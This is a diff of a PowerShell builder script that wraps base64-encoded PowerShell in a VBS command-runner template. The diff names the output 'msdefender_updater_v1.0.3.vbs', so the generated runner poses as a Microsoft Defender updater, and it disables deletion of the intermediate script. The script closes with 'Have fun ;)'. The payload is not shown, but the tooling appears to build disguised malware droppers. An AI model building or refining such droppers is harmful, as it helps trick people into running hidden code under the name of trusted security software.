@@ -1,3 +1,4 @@
+$output_filename = "msdefender_updater_v1.0.3.vbs"
 
 function Generate-Script {
     param (
@@ -39,11 +40,11 @@ Generate-Script -GeneratorPath ".\do_this.txt" `
 
 Generate-Script -GeneratorPath ".\src\b64_powershell_wrapper.ps1" `
                 -TemplatePath ".\src\b64_command_runner_template.vbs" `
-                -OutputPath ".\output.vbs"
+                -OutputPath $output_filename
 
 # Cleanup: Delete the generated PowerShell script after use
 if (Test-Path ".\src\powershell_command.ps1") {
-    Remove-Item -Path ".\src\powershell_command.ps1" -Force
+    #Remove-Item -Path ".\src\powershell_command.ps1" -Force
 }
 
 Write-Host "Have fun ;)"
